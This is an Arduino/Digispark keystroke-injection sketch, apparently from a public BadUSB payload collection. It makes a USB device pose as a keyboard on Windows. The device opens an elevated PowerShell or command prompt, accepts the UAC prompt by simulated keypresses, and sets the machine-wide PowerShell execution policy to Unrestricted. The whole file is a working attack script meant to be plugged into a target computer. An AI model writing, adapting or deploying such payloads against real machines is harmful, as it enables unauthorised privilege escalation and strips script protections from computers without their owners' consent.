#include "DigiKeyboard.h"
#define kbd_es_es
// This script is designed for use on Windows machines with QWERTY as a keyboard layout
// As DigiKeyboard Library does not support AZERTY text yet in print(), you have to use the "az_qw_convert.sh" script to convert AZERTY to QWERTY layout.
// For more scripts checkout: https://git.io/vAGf4
// Developer: NBN | 02/13/2018 @19:00 UTC
void setup() {
  // Initialize the digital pin as an output.
  pinMode(1, OUTPUT); //LED on Model A
}
void cmd_1() {
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
  DigiKeyboard.delay(1500);
  DigiKeyboard.print("c;d");
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
void cmd_2() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Start-Process powershell -Verb runAs");
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(10000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.println("Set-ExecutionPolicy -Scope LocalMachine Unrestricted");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("S");
  DigiKeyboard.delay(500);
}

void cmd_3() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("a");
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(6000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Start-Process powershell -Verb runAs");
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(6000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.println("Set-ExecutionPolicy -Scope LocalMachine Unrestricted");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("S");
  DigiKeyboard.delay(500);
}
// Infinite loop
void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  digitalWrite(1, HIGH); // LED on <--> Action start
  //cmd_1(); // Open CMD in Administrator Privileges using METHOD 1 (UNCOMMENT TO USE)
  //cmd_2(); // Open CMD in Administrator Privileges using METHOD 2 (UNCOMMENT TO USE)
  cmd_3(); // Open CMD in Administrator Privileges using METHOD 3 (UNCOMMENT TO USE)
  
  digitalWrite(1, LOW); // LED off <--> Action end
  for(;;){ /*Infinite loop to disconnect device*/ }
}
